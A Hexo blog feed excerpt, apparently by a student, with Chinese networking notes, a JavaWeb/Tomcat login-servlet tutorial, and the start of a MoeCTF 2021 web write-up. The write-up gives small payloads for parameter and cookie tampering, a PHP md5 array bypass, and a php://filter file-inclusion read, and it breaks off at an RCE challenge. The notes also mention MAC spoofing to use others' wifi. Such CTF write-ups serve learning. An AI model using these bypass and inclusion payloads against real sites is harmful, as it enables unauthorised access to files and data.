id="协议-国际标准组织制定的规定各种规则的标准"><a href="#协议-国际标准组织制定的规定各种规则的标准" class="headerlink" title="协议:国际标准组织制定的规定各种规则的标准"></a>协议:国际标准组织制定的规定各种规则的标准</h6><h6 id="网络-Network-多个计算机连接起来"><a href="#网络-Network-多个计算机连接起来" class="headerlink" title="网络(Network):多个计算机连接起来"></a>网络(Network):多个计算机连接起来</h6><h6 id="互联网-internet-多个网段通过路由器连接"><a href="#互联网-internet-多个网段通过路由器连接" class="headerlink" title="互联网(internet):多个网段通过路由器连接"></a>互联网(internet):多个网段通过路由器连接</h6><h6 id="因特网-Internet-全世界最大的互联网"><a href="#因特网-Internet-全世界最大的互联网" class="headerlink" title="因特网(Internet):全世界最大的互联网"></a>因特网(Internet):全世界最大的互联网</h6><h6 id="ISP-Internet-Service-Provider-，Internet服务提供商，比如移动电信联通"><a href="#ISP-Internet-Service-Provider-，Internet服务提供商，比如移动电信联通" class="headerlink" title="ISP(Internet Service Provider)，Internet服务提供商，比如移动电信联通"></a>ISP(Internet Service Provider)，Internet服务提供商，比如移动电信联通</h6><h6 id="服务器机房"><a href="#服务器机房" class="headerlink" title="服务器机房:"></a>服务器机房:</h6><p><img src="https://i.loli.net/2021/10/23/Ezhqurye7ZUgWaj.png" alt="2"></p><h6 id="常见的几种接口"><a href="#常见的几种接口" class="headerlink" title="常见的几种接口"></a>常见的几种接口</h6><ol><li><h6 id="FastEthernet快速以太网口"><a href="#FastEthernet快速以太网口" class="headerlink" title="FastEthernet快速以太网口"></a>FastEthernet快速以太网口</h6></li><li><h6 id="Serial串口，路由器与路由器相连之间用串口"><a href="#Serial串口，路由器与路由器相连之间用串口" class="headerlink" title="Serial串口，路由器与路由器相连之间用串口"></a>Serial串口，路由器与路由器相连之间用串口</h6></li></ol><h6 id="NAT-Network-Address-Translation-转换"><a href="#NAT-Network-Address-Translation-转换" class="headerlink" title="NAT(Network Address Translation)转换"></a>NAT(Network Address Translation)转换</h6><ol><li><h6 id="路由器将私网IP转换为公网IP"><a href="#路由器将私网IP转换为公网IP" class="headerlink" title="路由器将私网IP转换为公网IP"></a>路由器将私网IP转换为公网IP</h6></li><li><h6 id="导致不同局域网之间的私网IP相同"><a href="#导致不同局域网之间的私网IP相同" class="headerlink" title="导致不同局域网之间的私网IP相同"></a>导致不同局域网之间的私网IP相同</h6></li><li><h6 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h6><ol><li><h6 id="可以节约公网IP"><a href="#可以节约公网IP" class="headerlink" title="可以节约公网IP"></a>可以节约公网IP</h6></li><li><h6 id="会隐藏内部真实IP"><a href="#会隐藏内部真实IP" class="headerlink" title="会隐藏内部真实IP"></a>会隐藏内部真实IP</h6></li></ol></li></ol><h4 id="网络互连模型"><a href="#网络互连模型" class="headerlink" title="网络互连模型:"></a>网络互连模型:</h4><ol><li><h5 id="OSI参考模型7层"><a href="#OSI参考模型7层" class="headerlink" title="OSI参考模型7层"></a>OSI参考模型7层</h5></li><li><h6 id="TCP-IP协议4层"><a href="#TCP-IP协议4层" class="headerlink" title="TCP/IP协议4层"></a>TCP/IP协议4层</h6></li><li><h6 id="学习研究-5层-数据链路层-物理层"><a href="#学习研究-5层-数据链路层-物理层" class="headerlink" title="学习研究 5层(数据链路层+物理层)"></a>学习研究 5层(数据链路层+<code>物理层</code>)</h6></li></ol><h4 id="Java搭建服务器开发环境"><a href="#Java搭建服务器开发环境" class="headerlink" title="Java搭建服务器开发环境"></a>Java搭建服务器开发环境</h4><h6 id="利用JavaWeb和tomcat搭建本地测试环境"><a href="#利用JavaWeb和tomcat搭建本地测试环境" class="headerlink" title="利用JavaWeb和tomcat搭建本地测试环境"></a>利用JavaWeb和tomcat搭建本地测试环境</h6><h6 id="略"><a href="#略" class="headerlink" title="略"></a>略</h6><h6 id="计算机之间通信基础"><a href="#计算机之间通信基础" class="headerlink" title="计算机之间通信基础"></a>计算机之间通信基础</h6><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">IP地址</span> <span class="hljs-literal">-</span>&gt; <span class="hljs-comment">网卡(MAC地址)</span>  --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">通信</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>  <span class="hljs-comment">网卡</span> <span class="hljs-literal">-</span>&gt; <span class="hljs-comment">IP地址</span><br><span class="hljs-comment">最终是根据MAC地址(网卡地址)，输送数据到网卡，被网卡接受</span><br></code></pre></td></tr></table></figure><h2 id="计算机之间的连接方式"><a href="#计算机之间的连接方式" class="headerlink" title="计算机之间的连接方式"></a>计算机之间的连接方式</h2><ol><li><h6 id="网线直连"><a href="#网线直连" class="headerlink" title="网线直连"></a>网线直连</h6><ol><li>Cisco Packet Tracer仿真软件使用(真香)</li></ol></li><li><h6 id="同轴电缆-一根线连起来，效率低"><a href="#同轴电缆-一根线连起来，效率低" class="headerlink" title="同轴电缆 (一根线连起来，效率低)"></a>同轴电缆 (一根线连起来，效率低)</h6><ol><li>半双工通信</li><li>容易冲突</li><li>不安全</li></ol></li><li><h6 id="集线器-Hub"><a href="#集线器-Hub" class="headerlink" title="集线器(Hub)"></a>集线器(Hub)</h6><ol><li>半双工通信</li><li>无筛选/存储功能，直接广播数据包</li><li>长时间占用带宽</li></ol></li><li><h6 id="网桥-bridge"><a href="#网桥-bridge" class="headerlink" title="网桥(bridge)"></a>网桥(bridge)</h6><ol><li>通过自学习功能构建MAC地址表</li><li>对发来的数据包检测，起到一定筛选作用。比集线器提高效率，隔绝冲突域</li></ol></li><li><h6 id="交换机-Switch-集线器-多接口网桥"><a href="#交换机-Switch-集线器-多接口网桥" class="headerlink" title="交换机(Switch) 集线器+多接口网桥"></a>交换机(Switch) 集线器+多接口网桥</h6><ol><li>全双工通信</li><li>局域网的最终方案</li></ol></li><li><h6 id="路由器-Router"><a href="#路由器-Router" class="headerlink" title="路由器(Router)"></a>路由器(Router)</h6><ol><li><p>可以在不同网段之间传送数据(需借用网关)</p></li><li><p>隔绝广播域(不同网段)</p><p><img src="https://i.loli.net/2021/10/23/8znfK9YgHsyoauP.png" alt="2"></p></li></ol></li></ol><h6 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h6><ol><li>arp -a查看当前计算机缓存MAC地址</li><li>ping命令使用的ICMP协议</li></ol><h2 id="MAC地址-Media-Access-Control-Address"><a href="#MAC地址-Media-Access-Control-Address" class="headerlink" title="MAC地址(Media Access Control Address)"></a>MAC地址(Media Access Control Address)</h2><ol><li>每一个网卡都有固化的一个6字节(48bit)的MAC地址</li><li>前三字节:组织唯一标识符，厂家号,后三字节:网络接口标识符，厂家分配的号</li><li>使用ipconfig 查看主机MAC地址</li><li>FF-FF-FF-FF-FF-FF为广播MAC地址</li><li>可利用修改MAC地址蹭网</li><li>获取成功对方MAC地址，会将MAC地址进行缓存，称为ARP缓存</li></ol><h2 id="IP地址-Internet-Protocol-Address"><a href="#IP地址-Internet-Protocol-Address" class="headerlink" title="IP地址(Internet Protocol Address)"></a>IP地址(Internet Protocol Address)</h2><h6 id="IPV4-4字节-IPV6-16字节"><a href="#IPV4-4字节-IPV6-16字节" class="headerlink" title="IPV4 (4字节) IPV6(16字节)"></a>IPV4 (4字节) IPV6(16字节)</h6><ol><li>IP地址有网络标识+主机标识表示</li><li>子网掩码:用来算网段(IP地址与子网掩码=网段号)</li><li>IP地址分类<ol><li>A类,B类,C类,D类,E类(具体细节略)</li><li>区别:子网掩码不同，开头不同</li><li>主机地址全0位网段地址，全1为网段所有IP主机</li></ol></li><li>子网掩码的CIDR表示方法<ol><li>192.168.1.1/24 24代表24个1，子网掩码为255.255.255.0</li></ol></li><li>子网划分<ol><li>借用主机位作子网位，划分成多个子网，避免IP地址浪费</li><li>等长子网划分/变长子网划分</li></ol></li><li>超网:<ol><li>跟子网相反，将多个连续的网段合并成一个更大的网段</li><li>若合并网段，需连续的网段</li></ol></li></ol><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><ol><li><p>在不同网段间转发数据，需要有路由器的支持</p></li><li><p>默认情况下，路由器只知道与他直连的网段，非直连的网段都要通过静态路由，动态路由告诉他</p><ol><li><p>静态路由</p><p>管理员手动添加路由信息，适用于小规模网络(手动配置路由表)</p></li><li><p>动态路由</p><p>路由器通过路由选择协议(RIP，OSPF)自动获取路由信息，适用于大规模网络(自动配置路由表)</p></li></ol></li></ol><h2 id="数据包的传输过程"><a href="#数据包的传输过程" class="headerlink" title="数据包的传输过程"></a>数据包的传输过程</h2><ol><li><p>数据包(IP不变，MAC地址实时更改)</p><table><thead><tr><th align="left">数据</th><th>值</th></tr></thead><tbody><tr><td align="left">源IP</td><td>192.168.1.10</td></tr><tr><td align="left">目标IP</td><td>192.168.3.10</td></tr><tr><td align="left">源MAC</td><td>M1(实时更改)</td></tr><tr><td align="left">目标MAC</td><td>M2(实时更改)</td></tr><tr><td align="left"></td><td></td></tr></tbody></table></li></ol><h2 id="家用路由器"><a href="#家用路由器" class="headerlink" title="家用路由器"></a>家用路由器</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">内部结构为一个路由器和一个交换机，所连接的设备在同一个网段内 0<br></code></pre></td></tr></table></figure><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初探前后端交互</title>
    <link href="/2021/09/29/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/"/>
    <url>/2021/09/29/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/</url>
    
    <content type="html"><![CDATA[<h1 id="初探前后端交互"><a href="#初探前后端交互" class="headerlink" title="初探前后端交互"></a>初探前后端交互</h1><h2 id="如有错误请不吝指出"><a href="#如有错误请不吝指出" class="headerlink" title="如有错误请不吝指出"></a>如有错误请不吝指出</h2><span id="more"></span><h6 id="由于学习网络协议，需通过C-S进行试验，故利用JavaWeb-TomCat搭建本地服务。由于本人没有服务器开发经验，故此文章仅记录搭建基础操作"><a href="#由于学习网络协议，需通过C-S进行试验，故利用JavaWeb-TomCat搭建本地服务。由于本人没有服务器开发经验，故此文章仅记录搭建基础操作" class="headerlink" title="由于学习网络协议，需通过C/S进行试验，故利用JavaWeb+TomCat搭建本地服务。由于本人没有服务器开发经验，故此文章仅记录搭建基础操作"></a>由于学习网络协议，需通过C/S进行试验，故利用JavaWeb+TomCat搭建本地服务。由于本人没有服务器开发经验，故此文章仅记录搭建基础操作</h6><h2 id="Step1-准备"><a href="#Step1-准备" class="headerlink" title="Step1(准备):"></a>Step1(准备):</h2><ol><li><h6 id="创建空pooject并导入java模块"><a href="#创建空pooject并导入java模块" class="headerlink" title="创建空pooject并导入java模块"></a>创建空pooject并导入java模块</h6></li><li><h6 id="添加JavaWeb框架"><a href="#添加JavaWeb框架" class="headerlink" title="添加JavaWeb框架"></a>添加JavaWeb框架</h6></li><li><h6 id="部署TomCat以及导入Tomcat外部库-相当于服务器托管给TomCat"><a href="#部署TomCat以及导入Tomcat外部库-相当于服务器托管给TomCat" class="headerlink" title="部署TomCat以及导入Tomcat外部库(相当于服务器托管给TomCat)"></a>部署TomCat以及导入Tomcat外部库(相当于服务器托管给TomCat)</h6></li></ol><h2 id="Step2-前端测试-："><a href="#Step2-前端测试-：" class="headerlink" title="Step2(前端测试)："></a>Step2(前端测试)：</h2><ol><li><h6 id="web文件夹下创建HTML文件夹用于存放HTML代码，以下为本地测试HTML代码"><a href="#web文件夹下创建HTML文件夹用于存放HTML代码，以下为本地测试HTML代码" class="headerlink" title="web文件夹下创建HTML文件夹用于存放HTML代码，以下为本地测试HTML代码"></a>web文件夹下创建HTML文件夹用于存放HTML代码，以下为本地测试HTML代码</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>this is a test .html<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="2-Web文件夹相当于网站根路径-访问http-localhost-8080-html-test-html即可访问"><a href="#2-Web文件夹相当于网站根路径-访问http-localhost-8080-html-test-html即可访问" class="headerlink" title="2.Web文件夹相当于网站根路径,访问http://localhost:8080/html/test.html即可访问"></a>2.Web文件夹相当于网站根路径,访问<a href="http://localhost:8080/html/test.html%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE">http://localhost:8080/html/test.html即可访问</a></h6></li></ol><h2 id="Step3-前后端交互"><a href="#Step3-前后端交互" class="headerlink" title="Step3(前后端交互):"></a>Step3(前后端交互):</h2><ol><li><h6 id="web文件夹下创建login-html-构建一个form表单"><a href="#web文件夹下创建login-html-构建一个form表单" class="headerlink" title="web文件夹下创建login.html,构建一个form表单"></a>web文件夹下创建login.html,构建一个form表单</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/study/login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>用户名<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>密码<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><h6 id="src文件夹下创建LoginServlet-java"><a href="#src文件夹下创建LoginServlet-java" class="headerlink" title="src文件夹下创建LoginServlet.java"></a>src文件夹下创建LoginServlet.java</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mj.servlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(&quot;/login&quot;)</span>  <span class="hljs-comment">//相当于在网站根路径创建文件login</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br><span class="hljs-comment">//        super.doGet(req, resp);</span><br>        System.out.println(<span class="hljs-string">&quot;doget---&quot;</span>);<br>        String username = req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>        String password = req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br>        System.out.println(username+<span class="hljs-string">&quot; &quot;</span>+password);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;123&quot;</span>.equals(username)&amp;&amp;<span class="hljs-string">&quot;456&quot;</span>.equals(password))&#123;<br>            <span class="hljs-comment">//登录成功</span><br>            resp.getWriter().write(<span class="hljs-string">&quot;login success&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            resp.getWriter().write(<span class="hljs-string">&quot;login failure&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><h6 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h6><h6 id="在http-localhost-8080-study-html-login-html输入用户名和密码"><a href="#在http-localhost-8080-study-html-login-html输入用户名和密码" class="headerlink" title="在http://localhost:8080/study/html/login.html输入用户名和密码"></a>在<a href="http://localhost:8080/study/html/login.html%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81">http://localhost:8080/study/html/login.html输入用户名和密码</a></h6><p><img src="/2021/09/29/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/2.png" alt="2"></p><h6 id="即可跳转到localhost-8080-study-login"><a href="#即可跳转到localhost-8080-study-login" class="headerlink" title="即可跳转到localhost:8080/study/login"></a>即可跳转到localhost:8080/study/login</h6></li></ol><p><img src="/2021/09/29/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/3.png" alt="2"></p><h6 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h6><p><img src="/2021/09/29/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/1.png" alt="2"></p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>前后端</tag>
      
      <tag>网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MoeCTF</title>
    <link href="/2021/09/26/CTF/moectf/"/>
    <url>/2021/09/26/CTF/moectf/</url>
    
    <content type="html"><![CDATA[<h1 id="MoeCTF-2021-Write-Up"><a href="#MoeCTF-2021-Write-Up" class="headerlink" title="MoeCTF-2021 Write Up"></a>MoeCTF-2021 Write Up</h1><span id="more"></span><h4 id="人生第一篇wp，如有错误请不吝指出"><a href="#人生第一篇wp，如有错误请不吝指出" class="headerlink" title="人生第一篇wp，如有错误请不吝指出"></a>人生第一篇wp，如有错误请不吝指出</h4><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h6 id="1-Web安全入门指北—GET"><a href="#1-Web安全入门指北—GET" class="headerlink" title="1.Web安全入门指北—GET"></a>1.Web安全入门指北—GET</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">payload:<span class="hljs-attribute">moe</span>=flag<br></code></pre></td></tr></table></figure><h6 id="2-Web安全入门指北—POST"><a href="#2-Web安全入门指北—POST" class="headerlink" title="2.Web安全入门指北—POST"></a>2.Web安全入门指北—POST</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1.利用hackbar传入post参数<span class="hljs-attribute">moe</span>=flag<br>2.利用bp(burpsuite)抓包更改post参数为<span class="hljs-attribute">moe</span>=flag<br>3.利用python requests库写脚本<br></code></pre></td></tr></table></figure><h6 id="3-Web安全入门指北—小饼干"><a href="#3-Web安全入门指北—小饼干" class="headerlink" title="3.Web安全入门指北—小饼干"></a>3.Web安全入门指北—小饼干</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.利用bp抓包将cookie中的vip设为<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h6 id="4-2048"><a href="#4-2048" class="headerlink" title="4.2048"></a>4.2048</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">起初思路:<br><span class="hljs-number">1.</span>查看网页js代码可知分数由score参数控制，故想在<span class="hljs-built_in">console</span>更改score初始值，提交到网页后端。未遂<br>正确解法:<br><span class="hljs-number">2.</span>仔细审查源代码发现<br><span class="hljs-attr">getFlag</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> XMLHttpRequest;<br>req.open(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;flag.php?score=&quot;</span>+obj.score,<span class="hljs-literal">true</span>);<br>req.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>alert(<span class="hljs-built_in">this</span>.responseText);<br>&#125;<br>req.send();<br>&#125;<br>&#125;<br>故只需构造payload:?score=<span class="hljs-number">500000</span>即可<br></code></pre></td></tr></table></figure><h6 id="5-Web-Inc"><a href="#5-Web-Inc" class="headerlink" title="5.Web_Inc"></a>5.Web_Inc</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码:<br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>!=<span class="hljs-variable">$b</span>&amp;&amp;md5(<span class="hljs-variable">$a</span>)===md5(<span class="hljs-variable">$b</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;try again&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span>考察知识<br><span class="hljs-built_in">get</span>/<span class="hljs-built_in">post</span> md5绕过<br><span class="hljs-number">2.</span>解决方法<br>===会比较类型，可以用到PHP中md5()函数无法处理数组（会返回<span class="hljs-literal">NULL</span>）来实现绕过。<br>构造payload:<br><span class="hljs-keyword">a</span>[]=<span class="hljs-number">1</span> b[]=<span class="hljs-number">2</span>即可<br></code></pre></td></tr></table></figure><h6 id="6-ezinclude"><a href="#6-ezinclude" class="headerlink" title="6.ezinclude"></a>6.ezinclude</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码：<br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.考察知识<br>php远程文件包含漏洞 base64加解密<br><span class="hljs-number">2</span>.解决方法<br>构造payload:file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br>详情请参考博客:https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/lilongsy/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">108146107</span><br>base64加解密百度在线网站即可<br></code></pre></td></tr></table></figure><h6 id="7-babeRCE"><a href="#7-babeRCE" class="headerlink" title="7.babeRCE"></a>7.babeRCE</h6><figure class="highlight php"><table><tr><td 